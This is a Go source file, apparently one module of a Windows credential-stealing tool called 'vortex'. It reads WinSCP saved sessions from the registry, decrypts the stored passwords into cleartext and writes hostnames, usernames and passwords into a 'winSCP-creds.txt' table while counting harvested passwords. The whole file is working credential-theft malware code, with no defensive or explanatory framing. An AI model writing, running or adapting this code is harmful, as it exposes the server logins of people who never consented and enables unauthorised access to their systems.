//go:build windows

package softwares

import (
	"os"
	"path/filepath"
	"strconv"
	"vortex/encrypt"
	"vortex/hutil"

	"github.com/olekukonko/tablewriter"
	"golang.org/x/sys/windows/registry"
)

func decNext(pbytes []byte) (byte, []byte) {
	if len(pbytes) <= 0 {
		return 0, pbytes
	}
	a := pbytes[0]
	b := pbytes[1]
	pbytes = pbytes[2:]

	return ^(((a << 4) + b) ^ 0xA3) & 0xFF, pbytes
}

func decryptWinSCPpass(hostname string, username string, password string) string {

	var (
		flag   byte
		length byte = 0
		i      byte
		val    byte
	)

	clearTextPassword := ""
	key := username + hostname
	passbytes := []byte{}

	for i := 0; i < len(password); i++ {
		val, _ := strconv.ParseInt(string(password[i]), 16, 8)
		passbytes = append(passbytes, byte(val))
	}

	flag, passbytes = decNext(passbytes)
	if flag == 0xFF {
		_, passbytes = decNext(passbytes)
		length, passbytes = decNext(passbytes)
	} else {
		length = flag
	}

	toDel, passbytes := decNext(passbytes)
	passbytes = passbytes[toDel*2:]

	for i = 0; i < length; i++ {
		val, passbytes = decNext(passbytes)
		clearTextPassword += string(val)
	}

	if flag == 0xFF {
		clearTextPassword = clearTextPassword[len(key):]
	}

	return clearTextPassword
}

func winSCPSubkeyList() ([]string, error) {
	var winscpRegPath = "Software\\Martin Prikryl\\WinSCP 2\\Sessions"

	k, err := registry.OpenKey(registry.CURRENT_USER, winscpRegPath, registry.ENUMERATE_SUB_KEYS)
	if err == registry.ErrNotExist {
		return nil, nil
	}
	defer k.Close()

	winscpSessions, err := k.ReadSubKeyNames(0)
	if err != nil {
		return nil, err
	}

	return winscpSessions, nil
}

func WinSCPDataQuery(mainFolder string) error {
	var out []string

	subKeys, err := winSCPSubkeyList()
	if err != nil {
		return err
	}

	if subKeys == nil {
		return nil
	}

	winscpFile := filepath.Join(mainFolder, encrypt.B64Util("winSCP-creds.txt", 0))
	file, err := os.Create(winscpFile)
	if err != nil {
		return err
	}
	defer file.Close()

	regKeys := []string{
		"HostName",
		"UserName",
		"Password",
	}

	creds := tablewriter.NewWriter(file)
	creds.SetHeader(regKeys)

	for i := range subKeys {
		k, err := registry.OpenKey(registry.CURRENT_USER, "Software\\Martin Prikryl\\WinSCP 2\\Sessions\\"+subKeys[i], registry.QUERY_VALUE)
		if err != nil {
			return err
		}
		defer k.Close()
		for j := range regKeys {
			v, _, _ := k.GetStringValue(regKeys[j])
			out = append(out, v)
			if regKeys[j] == "Password" {
				clearPassword := decryptWinSCPpass(out[0], out[1], out[2])
				out[2] = clearPassword
				hutil.PasswordCounter++
			}
		}
		creds.Append(out)
		out = nil
	}
	creds.Render()

	return nil
}
